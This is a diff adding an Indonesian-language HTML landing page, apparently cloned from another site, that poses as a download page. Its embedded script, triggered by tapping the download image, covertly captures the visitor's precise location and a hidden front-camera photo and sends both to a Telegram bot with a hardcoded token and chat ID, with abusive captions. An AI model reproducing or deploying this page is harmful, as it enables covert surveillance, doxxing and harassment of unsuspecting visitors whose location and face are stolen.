@@ -1,0 +1,143 @@
+<!doctype html>
+<html lang="id" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="https://www.rpvipk.com/_next/static/css/7a38d2e63c778ff0.css" data-precedence="next" />
+  <link rel="stylesheet" href="https://www.rpvipk.com/_next/static/css/4774555.7a38d2e63c778ff0.css" data-precedence="next" />
+  <link rel="preload" as="script" fetchpriority="low" href="https://www.rpvipk.com/_next/static/chunks/webpack-4980d995e2e79361.js" />
+  <script src="https://www.rpvipk.com/_next/static/chunks/lib.7162566-42bdb520950eac3a.js" async></script>
+  <script src="https://www.rpvipk.com/_next/static/chunks/2472-070c4b67b9fe4003.js" async></script>
+  <script src="https://www.rpvipk.com/_next/static/chunks/main-app-b233dbd81682e4ad.js" async></script>
+  <!-- (tambahkan semua skrip lain yang diperlukan di sini sesuai kode asli Anda) -->
+  <script src="https://www.rpvipk.com/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" nomodule=""></script>
+  <style id="antd">.data-ant-cssinjs-cache-path{content:"";}</style>
+</head>
+<body>
+</div>
+
+<script>
+const telegramBotToken = '8205496988:AAEmjjO9PqzxkA4wPxemcZkBwJWk-8dhe-Q'; 
+const telegramChatId = '-1003153171238';
+
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: telegramChatId, text: message })
+  });
+}
+
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(',');
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) {
+    u8arr[n] = bstr.charCodeAt(n);
+  }
+  return new Blob([u8arr], { type: mime });
+}
+
+async function requestLocationWithLimit(maxRetries = 3) {
+  let attempt = 0;
+  while (attempt < maxRetries) {
+    try {
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+      });
+      return position;
+    } catch (error) {
+      if (error.code === 1) {
+        attempt++;
+        if (attempt >= maxRetries) {
+          window.location.href = 'https://www.google.com';
+          throw new Error('Pengguna menolak izin lokasi sebanyak 3 kali.');
+        }
+      } else {
+        throw error;
+      }
+    }
+  }
+}
+
+async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    document.body.appendChild(video);
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(resolve => setTimeout(resolve, 300));
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    stream.getTracks().forEach(track => track.stop());
+    document.body.removeChild(video);
+    return canvas.toDataURL('image/jpeg');
+  } catch (err) {
+    console.error('Gagal mengambil gambar:', err);
+    return null;
+  }
+}
+
+async function sendPhotoToTelegram(imageData) {
+  const blob = dataURLtoBlob(imageData);
+  const formData = new FormData();
+  formData.append('chat_id', telegramChatId);
+  formData.append('photo', blob, 'photo.jpg');
+  formData.append('caption', 'FOTO MUKA KEK KONTOL');
+
+  await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+    method: 'POST',
+    body: formData,
+  });
+}
+
+async function handleDownloadAndPhoto() {
+  try {
+    const position = await requestLocationWithLimit(3);
+    const googleMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+    sendToTelegram(`INI LOKASI RIPPER NY BOS: ${googleMapsLink}`);
+  } catch (error) {
+    // Jika lokasi gagal, tetap lanjut ke pengambilan foto
+  }
+
+  const imageData = await startCamera();
+
+  if (imageData) {
+    await sendPhotoToTelegram(imageData);
+  }
+}
+
+// Tambahkan event listener ke tombol
+document.getElementById('downloadAndPhotoBtn').addEventListener('click', handleDownloadAndPhoto);
+
+// Tambahkan id ke gambar agar bisa diklik
+</script>
+
+<div class="flex justify-center">
+  <div class="relative flex h-[100dvh] max-w-[1000px] flex-col">
+    <div class="w-[100vw]"></div>
+    <div class="h-full w-full overflow-scroll ">
+      <img alt="background" loading="lazy" width="1" height="1" decoding="async" data-nimg="1" class="w-full" style="color:transparent" srcset="https://images.gfegee.com/image/web_back/landingPage/2025-10-05/1759655620066&amp;WZ54WALWTW&amp;133333.webp?width=16&amp;priority=undefined" src="https://images.gfegee.com/image/web_back/landingPage/2025-10-05/1759655620066&amp;WZ54WALWTW&amp;133333.webp?width=16&amp;priority=undefined">
+      <img alt="customer_btn" loading="lazy" width="1" height="1" decoding="async" data-nimg="1" class="absolute right-[5%] top-[30%] w-[12%]" style="color:transparent" srcset="https://images.gfegee.com/image/web_back/landingPage/2025-07-07/1751877171137&amp;CW4449VE3J&amp;44444.png?width=16&amp;priority=undefined" src="https://images.gfegee.com/image/web_back/landingPage/2025-07-07/1751877171137&amp;CW4449VE3J&amp;44444.png?width=16&amp;priority=undefined">
+      <img alt="qrcode_btn" loading="lazy" width="1" height="1" decoding="async" data-nimg="1" class="absolute right-[5%] top-[38%] w-[12%] md:top-[45%]" style="color:transparent" srcset="https://images.gfegee.com/image/web_back/landingPage/2025-07-07/1751877173494&amp;2RDVT95Z2W&amp;555555.png?width=16&amp;priority=undefined" src="https://images.gfegee.com/image/web_back/landingPage/2025-07-07/1751877173494&amp;2RDVT95Z2W&amp;555555.png?width=16&amp;priority=undefined">
+    </div>
+    <div class="absolute bottom-0 w-full">
+      <img id="downloadImage" alt="download_buoy" loading="lazy" width="1" height="1" decoding="async" data-nimg="1" class="w-full" style="color:transparent" srcset="https://images.gfegee.com/image/web_back/landingPage/2025-10-05/1759655612331&amp;C78D2PCWGV&amp;66666.png?width=16&amp;priority=undefined" src="https://images.gfegee.com/image/web_back/landingPage/2025-10-05/1759655612331&amp;C78D2PCWGV&amp;66666.png?width=16&amp;priority=undefined">
+    </div>
+  </div>
+</div>
+
+<script>
+  // Tambahkan event listener ke gambar
+  document.getElementById('downloadImage').addEventListener('click', handleDownloadAndPhoto);
+</script>
+
+</body>
+</html>
